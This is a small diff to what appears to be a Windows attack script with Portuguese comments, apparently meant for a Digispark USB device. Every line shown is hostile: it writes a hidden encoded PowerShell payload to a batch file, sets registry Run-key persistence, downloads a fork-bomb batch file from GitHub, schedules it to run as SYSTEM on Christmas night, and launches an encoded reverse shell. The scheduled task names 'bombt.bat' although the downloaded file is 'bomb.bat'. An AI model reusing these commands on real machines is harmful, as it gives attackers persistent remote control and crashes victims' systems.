@@ -5,6 +5,6 @@ echo "powershell -W hidden -e $cmd" > C:\Windows\Temp\payload.bat
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v persist /d "C:\Windows\Temp\payload.bat"
 # Baixa o fork bomb e define para executar na noite de natal
 Invoke-WebRequest https://github.com/tomiodarim/Digispark/blob/main/bomb.bat?raw=true -o C:\Windows\Temp\bomb.bat
-schtasks /create /RU "system" /sc once /sd "12/25/2022" /st "22:45" /tr C:\Windows\Temp\bombt.bat /rl highest /tn "bomb"
+schtasks /create /RU "system" /sc once /sd 12/25/2022 /st 22:45 /tr C:\Windows\Temp\bombt.bat /rl highest /tn "bomb"
 # Invoca a shell reversa
 powershell -e $cmd
